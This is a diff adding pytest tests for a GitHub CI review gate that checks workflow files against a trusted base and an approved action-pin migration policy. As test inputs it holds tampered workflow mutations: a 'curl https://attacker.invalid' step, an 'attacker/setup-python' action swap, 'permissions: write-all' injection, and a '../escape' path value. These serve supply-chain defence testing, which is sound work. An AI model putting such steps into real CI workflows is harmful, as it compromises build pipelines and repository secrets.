@@ -1,7 +1,9 @@
 """Contract tests for the GitHub independent review gate."""
 from __future__ import annotations
 
+import base64
 import copy
+import hashlib
 import importlib.util
 import json
 import urllib.error
@@ -360,6 +362,142 @@ def test_latest_official_failure_wins_over_prior_success(monkeypatch):
     with pytest.raises(ValueError, match="not green: Structure and tests"):
         gate.required_checks_green(
             {"total_count": 2, "check_runs": [old, newer]}, HEAD, "main", trusted)
+
+
+
+def _contents_blob(data: bytes) -> dict:
+    """Model the complete REST contents response, including the authenticated blob SHA."""
+    git_blob = b"blob " + str(len(data)).encode("ascii") + b"\0" + data
+    return {
+        "type": "file",
+        "sha": hashlib.sha1(git_blob, usedforsecurity=False).hexdigest(),
+        "encoding": "base64",
+        "content": base64.b64encode(data).decode("ascii"),
+    }
+
+
+def _approved_upgrade_fixture(monkeypatch) -> tuple[bytes, bytes, dict]:
+    policy_bytes = gate.PIN_MIGRATION_FILE.read_bytes()
+    migration = json.loads(policy_bytes)["migrations"][0]
+    original = ("name: Validate skills\njobs:\n  validate:\n    steps:\n"
+                + "      - name: Set up Python\n"
+                + migration["before_line"] + "\n"
+                + "        with:\n          python-version: '3.12'\n").encode("utf-8")
+    updated = original.replace(
+        (migration["before_line"] + "\n").encode("utf-8"),
+        (migration["after_line"] + "\n").encode("utf-8"))
+    response = {
+        f"/repos/org/repo/contents/.github/workflows/validate.yml?ref={BASE_SHA}":
+            _contents_blob(original),
+        f"/repos/org/repo/contents/.github/workflows/validate.yml?ref={HEAD}":
+            _contents_blob(updated),
+        f"/repos/org/repo/contents/{gate.PIN_MIGRATION_PATH}?ref={BASE_SHA}":
+            _contents_blob(policy_bytes),
+    }
+    monkeypatch.setattr(gate, "github", lambda path, token: response[path])
+    return original, updated, response
+
+
+def test_preapproved_pin_only_migration_keeps_workflow_check_trusted(monkeypatch):
+    original, updated, response = _approved_upgrade_fixture(monkeypatch)
+    assert original != updated
+    assert gate.verify_trusted_workflow_source(
+        "org/repo", ".github/workflows/validate.yml", BASE_SHA, HEAD, "token") is None
+    assert all(f"?ref={HEAD}" not in key or gate.PIN_MIGRATION_PATH not in key
+               for key in response)
+
+
+@pytest.mark.parametrize("mutation", [
+    lambda data: data + b"      - run: curl https://attacker.invalid\n",
+    lambda data: data.replace(b"python-version: '3.12'", b"python-version: '3.11'"),
+    lambda data: data.replace(b"actions/setup-python@", b"attacker/setup-python@"),
+    lambda data: data.replace(b"# v7.1.0", b"# latest"),
+    lambda data: data.replace(b"actions/setup-python@6d4fd22", b"actions/setup-python@00000000"),
+    lambda data: data.replace(b"actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0",
+                              b"actions/setup-python@v7"),
+    lambda data: data.replace(b"        uses:", b"       uses:"),
+    lambda data: data.replace(b"jobs:\n", b"jobs:\npermissions: write-all\n"),
+])
+def test_preapproved_pin_migration_rejects_sibling_mutations(monkeypatch, mutation):
+    _, candidate, response = _approved_upgrade_fixture(monkeypatch)
+    path = f"/repos/org/repo/contents/.github/workflows/validate.yml?ref={HEAD}"
+    changed = mutation(candidate)
+    assert changed != candidate
+    response[path] = _contents_blob(changed)
+    with pytest.raises(ValueError, match="differs from trusted base"):
+        gate.verify_trusted_workflow_source(
+            "org/repo", ".github/workflows/validate.yml", BASE_SHA, HEAD, "token")
+
+
+def test_preapproved_pin_migration_rejects_duplicate_old_line(monkeypatch):
+    original, updated, response = _approved_upgrade_fixture(monkeypatch)
+    old_line = json.loads(gate.PIN_MIGRATION_FILE.read_bytes())["migrations"][0]["before_line"]
+    candidate_line = json.loads(gate.PIN_MIGRATION_FILE.read_bytes())["migrations"][0]["after_line"]
+    duplicated = original + (old_line + "\n").encode("utf-8")
+    duplicate_head = updated + (candidate_line + "\n").encode("utf-8")
+    response[f"/repos/org/repo/contents/.github/workflows/validate.yml?ref={BASE_SHA}"] = (
+        _contents_blob(duplicated))
+    response[f"/repos/org/repo/contents/.github/workflows/validate.yml?ref={HEAD}"] = (
+        _contents_blob(duplicate_head))
+    with pytest.raises(ValueError, match="differs from trusted base"):
+        gate.verify_trusted_workflow_source(
+            "org/repo", ".github/workflows/validate.yml", BASE_SHA, HEAD, "token")
+
+
+@pytest.mark.parametrize("target", ["head-blob-sha", "base-blob-sha", "policy-blob-sha", "policy-drift"])
+def test_pin_upgrade_rejects_untrusted_bytes_or_base_policy(monkeypatch, target):
+    _, _, response = _approved_upgrade_fixture(monkeypatch)
+    workflow = "/repos/org/repo/contents/.github/workflows/validate.yml?ref="
+    policy = f"/repos/org/repo/contents/{gate.PIN_MIGRATION_PATH}?ref={BASE_SHA}"
+    if target == "head-blob-sha":
+        response[workflow + HEAD]["sha"] = "0" * 40
+    elif target == "base-blob-sha":
+        response[workflow + BASE_SHA]["sha"] = "0" * 40
+    elif target == "policy-blob-sha":
+        response[policy]["sha"] = "0" * 40
+    else:
+        response[policy] = _contents_blob(b'{"schema_version":1,"migrations":[]}')
+    with pytest.raises(ValueError, match="differs from trusted base"):
+        gate.verify_trusted_workflow_source(
+            "org/repo", ".github/workflows/validate.yml", BASE_SHA, HEAD, "token")
+
+
+def test_pin_upgrade_rejects_missing_policy_and_unapproved_workflow(monkeypatch, tmp_path):
+    _, _, response = _approved_upgrade_fixture(monkeypatch)
+    prior_policy = gate.PIN_MIGRATION_FILE
+    monkeypatch.setattr(gate, "PIN_MIGRATION_FILE", tmp_path / "not-installed.json")
+    with pytest.raises(ValueError, match="differs from trusted base"):
+        gate.verify_trusted_workflow_source(
+            "org/repo", ".github/workflows/validate.yml", BASE_SHA, HEAD, "token")
+    monkeypatch.setattr(gate, "PIN_MIGRATION_FILE", prior_policy)
+    base_workflow = response[
+        f"/repos/org/repo/contents/.github/workflows/validate.yml?ref={BASE_SHA}"]
+    head_workflow = response[
+        f"/repos/org/repo/contents/.github/workflows/validate.yml?ref={HEAD}"]
+    response[f"/repos/org/repo/contents/.github/workflows/github-audit-mcp.yml?ref={BASE_SHA}"] = (
+        base_workflow)
+    response[f"/repos/org/repo/contents/.github/workflows/github-audit-mcp.yml?ref={HEAD}"] = (
+        head_workflow)
+    with pytest.raises(ValueError, match="differs from trusted base"):
+        gate.verify_trusted_workflow_source(
+            "org/repo", ".github/workflows/github-audit-mcp.yml", BASE_SHA, HEAD, "token")
+
+
+@pytest.mark.parametrize("invalid", [
+    {"schema_version": 1, "migrations": [], "allow_all": True},
+    {"schema_version": 1, "migrations": []},
+    {"schema_version": 1, "migrations": [{"workflow_path": "../escape"}]},
+    {"schema_version": 1, "migrations": [
+        {"workflow_path": ".github/workflows/validate.yml",
+         "before_line": "        uses: actions/setup-python@v7",
+         "after_line": "        uses: actions/setup-python@" + "f" * 40 + " # v7.1.0"}]},
+])
+def test_trusted_pin_policy_rejects_malformed_schemas(invalid):
+    with pytest.raises(ValueError):
+        gate._parse_pin_migrations(json.dumps(invalid).encode("utf-8"))
+    with pytest.raises(ValueError, match="duplicate"):
+        gate._parse_pin_migrations(
+            b'{"schema_version":1,"schema_version":1,"migrations":[]}')
 
 
 def test_workflow_contents_must_match_trusted_base(monkeypatch):
